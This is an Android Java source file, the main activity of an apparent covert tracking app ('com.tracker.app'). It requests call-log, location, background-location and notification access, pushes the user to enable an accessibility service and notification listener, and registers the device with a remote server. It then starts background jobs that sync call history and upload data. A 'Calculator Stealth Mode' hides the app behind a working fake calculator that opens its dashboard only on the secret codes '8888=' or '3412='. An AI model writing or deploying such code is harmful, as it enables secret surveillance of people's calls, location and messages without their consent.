package com.tracker.app;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.messaging.FirebaseMessaging;
import com.tracker.app.net.ApiClient;
import com.tracker.app.services.MonitoringForegroundService;
import com.tracker.app.jobs.CallHistorySyncJobService;
import com.tracker.app.jobs.HeartbeatJobService;
import com.tracker.app.jobs.UploadJobService;

/**
 * Main entry point. Shows a one-time setup screen to register the device,
 * then starts all background services and displays a secret calculator interface.
 */
public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    private static final int REQUEST_PERMISSIONS = 1001;
    private static final String PREFS_NAME = "tracker_prefs";

    private EditText deviceNameInput;
    private TextView statusText;
    private Button setupButton;
    
    private boolean isSetupScreenShown = false;
    private boolean isDashboardShown = false;

    // Calculator State Variables
    private String currentInput = "0";
    private double firstOperand = 0;
    private String activeOperator = "";
    private boolean clearOnNextDigit = false;
    private TextView calcDisplay;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        checkTokenAndNavigate();
    }

    @Override
    protected void onResume() {
        super.onResume();
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String token = prefs.getString("api_token", null);

        if (token != null && !token.isEmpty()) {
            startAllServices();
            if (isDashboardShown) {
                showRunningScreen();
            } else if (isCalculatorStealthModeActive()) {
                showCalculatorScreen();
            } else {
                showRunningScreen();
            }
        } else if (!isSetupScreenShown) {
            showSetupScreen();
        }
    }

    private boolean isCalculatorStealthModeActive() {
        try {
            ComponentName calculatorAlias = new ComponentName(this, getPackageName() + ".CalculatorAlias");
            int state = getPackageManager().getComponentEnabledSetting(calculatorAlias);
            return state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
        } catch (Exception e) {
            return false;
        }
    }

    private void checkTokenAndNavigate() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String token = prefs.getString("api_token", null);

        if (token != null && !token.isEmpty()) {
            startAllServices();
            if (isCalculatorStealthModeActive()) {
                showCalculatorScreen();
            } else {
                showRunningScreen();
            }
        } else {
            showSetupScreen();
        }
    }

    private void enableCalculatorStealthMode() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName serviceAlias = new ComponentName(this, getPackageName() + ".MainActivityAlias");
            ComponentName calculatorAlias = new ComponentName(this, getPackageName() + ".CalculatorAlias");

            // Enable calculator first (using DONT_KILL_APP to avoid premature exit)
            pm.setComponentEnabledSetting(
                    calculatorAlias,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                );

            // Disable original alias (passing 0 to kill the app process and force One UI to refresh immediately)
            pm.setComponentEnabledSetting(
                    serviceAlias,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    0
            );

            Toast.makeText(this, "Calculator Stealth Mode activated.", Toast.LENGTH_LONG).show();
            finish();
        } catch (Exception e) {
            Log.e(TAG, "Failed to enable Calculator Stealth Mode", e);
            Toast.makeText(this, "Failed to activate stealth mode: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    private void showSetupScreen() {
        isSetupScreenShown = true;
        isDashboardShown = false;
        ScrollView scroll = new ScrollView(this);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(60, 100, 60, 60);
        layout.setGravity(Gravity.CENTER_HORIZONTAL);

        TextView title = new TextView(this);
        title.setText("Device Setup");
        title.setTextSize(24);
        title.setGravity(Gravity.CENTER);
        layout.addView(title);

        View spacer = new View(this);
        spacer.setMinimumHeight(40);
        layout.addView(spacer);

        TextView label = new TextView(this);
        label.setText("Device Name:");
        label.setTextSize(16);
        layout.addView(label);

        deviceNameInput = new EditText(this);
        deviceNameInput.setHint("e.g. Dad's Phone");
        deviceNameInput.setSingleLine(true);
        layout.addView(deviceNameInput);

        View spacer2 = new View(this);
        spacer2.setMinimumHeight(20);
        layout.addView(spacer2);

        statusText = new TextView(this);
        statusText.setTextSize(14);
        statusText.setGravity(Gravity.CENTER);
        layout.addView(statusText);

        View spacer3 = new View(this);
        spacer3.setMinimumHeight(20);
        layout.addView(spacer3);

        setupButton = new Button(this);
        setupButton.setText("Register & Start");
        setupButton.setOnClickListener(v -> onSetupClicked());
        layout.addView(setupButton);

        scroll.addView(layout);
        setContentView(scroll);
    }

    private boolean isAccessibilityServiceEnabled() {
        String serviceId = getPackageName() + "/" + com.tracker.app.services.SpacebarAccessibilityService.class.getName();
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED
            );
        } catch (Settings.SettingNotFoundException e) {
            Log.e(TAG, "Error finding setting ACCESSIBILITY_ENABLED", e);
        }

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            if (settingValue != null) {
                return settingValue.contains(serviceId);
            }
        }
        return false;
    }

    private boolean isNotificationServiceEnabled() {
        String packageName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (flat != null && !flat.isEmpty()) {
            String[] names = flat.split(":");
            for (String name : names) {
                ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null && packageName.equals(cn.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }

    private void showRunningScreen() {
        isSetupScreenShown = false;
        ScrollView scroll = new ScrollView(this);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(60, 80, 60, 60);
        layout.setGravity(Gravity.CENTER_HORIZONTAL);

        boolean accEnabled = isAccessibilityServiceEnabled();
        boolean notifEnabled = isNotificationServiceEnabled();
        boolean allSystemServicesRunning = accEnabled && notifEnabled;

        TextView check = new TextView(this);
        check.setText(allSystemServicesRunning ? "✓" : "⚠");
        check.setTextSize(64);
        check.setTextColor(allSystemServicesRunning ? 0xFF2E7D32 : 0xFFEF6C00); // Dark Green or Dark Orange
        check.setGravity(Gravity.CENTER);
        layout.addView(check);

        TextView title = new TextView(this);
        title.setText(allSystemServicesRunning ? "System Service is Running" : "Setup Incomplete");
        title.setTextSize(20);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 10, 0, 10);
        layout.addView(title);

        TextView sub = new TextView(this);
        sub.setText("Ensure both services below are enabled for proper monitoring.");
        sub.setTextSize(14);
        sub.setGravity(Gravity.CENTER);
        sub.setPadding(0, 0, 0, 40);
        layout.addView(sub);

        // Accessibility Card
        addStatusCard(layout, "1. Accessibility Service", accEnabled, v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });

        View div1 = new View(this); div1.setMinimumHeight(30); layout.addView(div1);

        // Notification Card
        addStatusCard(layout, "2. Notification Listener", notifEnabled, v -> {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            startActivity(intent);
        });

        View div2 = new View(this); div2.setMinimumHeight(50); layout.addView(div2);

        // Stealth Mode / Calculator Trigger
        if (!isCalculatorStealthModeActive()) {
            Button hideBtn = new Button(this);
            hideBtn.setText("Activate Calculator Stealth Mode");
            hideBtn.setEnabled(allSystemServicesRunning);
            hideBtn.setOnClickListener(v -> confirmCalculatorStealthMode());
            layout.addView(hideBtn);

            if (!allSystemServicesRunning) {
                TextView hint = new TextView(this);
                hint.setText("Enable all services above to activate Calculator Stealth Mode.");
                hint.setTextSize(12);
                hint.setGravity(Gravity.CENTER);
                hint.setPadding(0, 10, 0, 0);
                layout.addView(hint);
            }
        } else {
            Button calcBtn = new Button(this);
            calcBtn.setText("Open Calculator Screen");
            calcBtn.setOnClickListener(v -> showCalculatorScreen());
            layout.addView(calcBtn);
        }

        scroll.addView(layout);
        setContentView(scroll);
    }

    private void confirmCalculatorStealthMode() {
        new AlertDialog.Builder(this)
                .setTitle("Stealth Mode")
                .setMessage("This will change the app icon to a Calculator. You can access this setup screen again by opening the Calculator and typing '8888='.")
                .setPositiveButton("Activate", (dialog, which) -> enableCalculatorStealthMode())
                .setNegativeButton("Cancel", null)
                .show();
    }

    private void showCalculatorScreen() {
        isDashboardShown = false;
        isSetupScreenShown = false;

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF121212);
        root.setWeightSum(6);
        root.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT));

        // Display
        calcDisplay = new TextView(this);
        calcDisplay.setTextSize(36);
        calcDisplay.setTextColor(0xFFFFFFFF);
        calcDisplay.setGravity(Gravity.RIGHT | Gravity.BOTTOM);
        calcDisplay.setPadding(30, 30, 30, 30);
        updateDisplay();
        
        LinearLayout.LayoutParams displayParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 2);
        root.addView(calcDisplay, displayParams);

        // Buttons Layout
        LinearLayout buttonsLayout = new LinearLayout(this);
        buttonsLayout.setOrientation(LinearLayout.VERTICAL);
        LinearLayout.LayoutParams buttonsParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 4);
        root.addView(buttonsLayout, buttonsParams);

        String[][] buttons = {
                {"C", "DEL", "%", "/"},
                {"7", "8", "9", "*"},
                {"4", "5", "6", "-"},
                {"1", "2", "3", "+"},
                {"0", "00", ".", "="}
        };

        for (int r = 0; r < 5; r++) {
            LinearLayout row = new LinearLayout(this);
            row.setOrientation(LinearLayout.HORIZONTAL);
            LinearLayout.LayoutParams rowParams = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT, 0, 1);
            rowParams.setMargins(5, 5, 5, 5);
            
            for (int c = 0; c < 4; c++) {
                final String text = buttons[r][c];
                Button btn = new Button(this);
                btn.setText(text);
                btn.setTextSize(20);
                btn.setTextColor(0xFFFFFFFF);
                
                // Set appropriate background color depending on operation
                int bgColor = 0xFF333333; // Default number dark grey
                if (text.equals("=") || text.equals("/") || text.equals("*") || text.equals("-") || text.equals("+")) {
                    bgColor = 0xFFFF9F0A; // iOS style Orange
                } else if (text.equals("C") || text.equals("DEL") || text.equals("%")) {
                    bgColor = 0xFF505050; // iOS style Light grey
                }
                
                btn.setBackgroundColor(bgColor);
                // Safe tint list setup to ensure Android theme engine displays background colors properly
                btn.setBackgroundTintList(android.content.res.ColorStateList.valueOf(bgColor));

                LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
                        0, LinearLayout.LayoutParams.MATCH_PARENT, 1);
                btnParams.setMargins(5, 5, 5, 5);
                btn.setOnClickListener(v -> handleCalcPress(text));
                row.addView(btn, btnParams);
            }
            buttonsLayout.addView(row, rowParams);
        }

        setContentView(root);
    }

    private void updateDisplay() {
        if (calcDisplay == null) return;
        
        if (activeOperator.isEmpty()) {
            calcDisplay.setText(currentInput);
        } else {
            if (clearOnNextDigit) {
                // Operator just pressed, waiting for second operand digits. Show the operator.
                calcDisplay.setText(formatResult(firstOperand) + " " + activeOperator);
            } else {
                // Second operand is being typed. Show full expression.
                calcDisplay.setText(formatResult(firstOperand) + " " + activeOperator + " " + currentInput);
            }
        }
    }

    private void handleCalcPress(String text) {
        Log.d(TAG, "Calculator Key: " + text + " | State BEFORE: Input=" + currentInput + ", firstOperand=" + firstOperand + ", activeOperator=" + activeOperator + ", clearOnNextDigit=" + clearOnNextDigit);
        
        if (text.matches("[0-9]") || text.equals("00") || text.equals(".")) {
            if (text.equals(".") && currentInput.contains(".")) {
                return; // Prevent duplicate decimals
            }
            if (clearOnNextDigit) {
                currentInput = "";
                clearOnNextDigit = false;
            }
            if (currentInput.equals("0") && !text.equals(".")) {
                currentInput = text;
            } else {
                currentInput += text;
            }
            updateDisplay();
        } else if (text.equals("C")) {
            currentInput = "0";
            firstOperand = 0;
            activeOperator = "";
            clearOnNextDigit = false;
            updateDisplay();
        } else if (text.equals("DEL")) {
            if (currentInput.length() > 0 && !currentInput.equals("0")) {
                currentInput = currentInput.substring(0, currentInput.length() - 1);
                if (currentInput.isEmpty() || currentInput.equals("-")) {
                    currentInput = "0";
                }
                updateDisplay();
            }
        } else if (text.equals("/") || text.equals("*") || text.equals("-") || text.equals("+")) {
            try {
                // If there's an active operator and a second operand is ready, do intermediate calculation
                if (!activeOperator.isEmpty() && !clearOnNextDigit) {
                    double secondOperand = Double.parseDouble(currentInput);
                    firstOperand = performCalculation(firstOperand, secondOperand, activeOperator);
                    currentInput = formatResult(firstOperand);
                } else {
                    firstOperand = Double.parseDouble(currentInput);
                }
            } catch (Exception e) {
                Log.e(TAG, "Operator evaluation error", e);
                firstOperand = 0;
            }
            activeOperator = text;
            clearOnNextDigit = true;
            updateDisplay();
        } else if (text.equals("%")) {
            try {
                double val = Double.parseDouble(currentInput);
                val = val / 100.0;
                currentInput = formatResult(val);
                updateDisplay();
            } catch (Exception e) {
                Log.e(TAG, "Percent error", e);
                if (calcDisplay != null) calcDisplay.setText("Error");
            }
        } else if (text.equals("=")) {
            // Secret codes to enter admin dashboard
            if (currentInput.equals("8888") || currentInput.equals("3412")) {
                Log.d(TAG, "Secret admin code matched: entering setup dashboard");
                isDashboardShown = true;
                showRunningScreen();
                return;
            }
            if (activeOperator.isEmpty()) return;
            try {
                double secondOperand = Double.parseDouble(currentInput);
                double result = performCalculation(firstOperand, secondOperand, activeOperator);
                currentInput = formatResult(result);
                calcDisplay.setText(currentInput);
            } catch (Exception e) {
                Log.e(TAG, "Equals evaluation error", e);
                if (calcDisplay != null) calcDisplay.setText("Error");
            }
            activeOperator = "";
            clearOnNextDigit = true;
        }
        
        Log.d(TAG, "Calculator Key: " + text + " | State AFTER: Input=" + currentInput + ", firstOperand=" + firstOperand + ", activeOperator=" + activeOperator + ", clearOnNextDigit=" + clearOnNextDigit);
    }

    private double performCalculation(double op1, double op2, String operator) {
        switch (operator) {
            case "/":
                return op2 == 0 ? 0 : op1 / op2;
            case "*":
                return op1 * op2;
            case "-":
                return op1 - op2;
            case "+":
                return op1 + op2;
            default:
                return op2;
        }
    }

    private String formatResult(double result) {
        String resultStr = String.valueOf(result);
        if (resultStr.endsWith(".0")) {
            resultStr = resultStr.substring(0, resultStr.length() - 2);
        }
        return resultStr;
    }

    private void addStatusCard(LinearLayout parent, String title, boolean isEnabled, View.OnClickListener onClick) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setPadding(30, 30, 30, 30);
        card.setBackgroundColor(0xFFF5F5F5);
        card.setGravity(Gravity.CENTER_HORIZONTAL);
        
        TextView t = new TextView(this);
        t.setText(title);
        t.setTextSize(16);
        t.setTypeface(null, android.graphics.Typeface.BOLD);
        card.addView(t);

        TextView s = new TextView(this);
        s.setText(isEnabled ? "Status: ENABLED" : "Status: DISABLED");
        s.setTextColor(isEnabled ? 0xFF2E7D32 : 0xFFC62828);
        s.setPadding(0, 10, 0, 20);
        card.addView(s);

        Button btn = new Button(this);
        btn.setText(isEnabled ? "Change Settings" : "Enable Now");
        btn.setOnClickListener(onClick);
        card.addView(btn);

        parent.addView(card);
    }

    private void onSetupClicked() {
        String name = deviceNameInput.getText().toString().trim();
        if (name.isEmpty()) {
            Toast.makeText(this, "Enter a device name", Toast.LENGTH_SHORT).show();
            return;
        }

        setupButton.setEnabled(false);
        statusText.setText("Requesting permissions...");

        requestAllPermissions();
    }

    private void requestAllPermissions() {
        String[] permissions = {
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.POST_NOTIFICATIONS,
        };

        requestPermissions(permissions, REQUEST_PERMISSIONS);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == REQUEST_PERMISSIONS) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                requestPermissions(
                    new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                    REQUEST_PERMISSIONS + 1
                );
            } else {
                onAllPermissionsHandled();
            }
        } else if (requestCode == REQUEST_PERMISSIONS + 1) {
            onAllPermissionsHandled();
        }
    }

    private void onAllPermissionsHandled() {
        requestBatteryOptimization();
        statusText.setText("Registering device...");
        registerDevice();
    }

    private void requestBatteryOptimization() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }
    }

    private void registerDevice() {
        String deviceName = deviceNameInput.getText().toString().trim();
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        String model = Build.MANUFACTURER + " " + Build.MODEL;
        String androidVersion = Build.VERSION.RELEASE;

        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
            String fcmToken = task.isSuccessful() ? task.getResult() : null;

            new Thread(() -> {
                try {
                    String apiToken = ApiClient.registerDevice(deviceName, deviceId, model, androidVersion, fcmToken);

                    if (apiToken != null) {
                        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                        prefs.edit()
                            .putString("api_token", apiToken)
                            .putString("device_name", deviceName)
                            .putString("device_id", deviceId)
                            .apply();

                        runOnUiThread(() -> {
                            statusText.setText("Registered! Starting services...");
                            startAllServices();
                            showRunningScreen();
                        });
                    } else {
                        runOnUiThread(() -> {
                            statusText.setText("Registration failed. Check server URL.");
                            setupButton.setEnabled(true);
                        });
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Registration error", e);
                    runOnUiThread(() -> {
                        statusText.setText("Error: " + e.getMessage());
                        setupButton.setEnabled(true);
                    });
                }
            }).start();
        });
    }

    private void startAllServices() {
        Intent intent = new Intent(this, MonitoringForegroundService.class);
        startForegroundService(intent);

        CallHistorySyncJobService.schedule(this);
        HeartbeatJobService.schedule(this);
        UploadJobService.schedule(this);

        // Try registering call listener if service is already running
        com.tracker.app.services.CallMonitorService.checkAndRegisterCellularListener(this);

        Log.d(TAG, "All services started");
    }
}
